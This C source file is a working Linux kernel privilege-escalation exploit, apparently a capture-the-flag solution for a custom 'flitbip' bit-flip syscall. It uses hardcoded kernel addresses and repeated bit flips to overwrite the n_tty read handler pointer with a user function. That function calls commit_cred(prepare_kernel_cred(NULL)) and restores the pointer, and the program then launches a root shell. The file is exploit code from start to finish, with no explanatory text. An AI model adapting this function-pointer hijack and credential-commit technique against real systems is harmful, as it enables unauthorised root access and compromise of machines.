#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include "tty_ldisc_ops.h"
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar(10); \
};
void flitbip(long *,long bit){
    asm(
        "mov rax,333;"
        "syscall;"
    );
}
struct tty_ldisc_ops* n_tty_ops_ptr = 0xffffffff8183e320;
u_int64_t n_tty_read = 0xffffffff810c8510;
void* flit_count = 0xffffffff818f4f78;
void (*commit_cred)(char *) = 0xffffffff81033d41;
char* (*prepare_kernel_cred)(void *)=0xffffffff81033e92;
void priv(){
    commit_cred(prepare_kernel_cred(NULL));
    u_int64_t *target = &n_tty_ops_ptr->read;
    *target = n_tty_read;
}
int main(){
    void *target = &n_tty_ops_ptr->read;//offsetof(struct tty_ldisc_ops,read)
    u_int64_t shellcode_addr = 0x1337;
    u_int64_t flipper = n_tty_read ^ (int64_t)priv;
    flitbip(flit_count,63); // flit_count = 0x8000000000000000;
    log_info("Target: %p",target);
    for(u_int64_t i=0;i<64;i++){
        if(flipper & 1 ==1){
            flitbip(target,i);
        }
        flipper >>=1;
    }
    read(0,NULL,0);
    system("/bin/sh");
}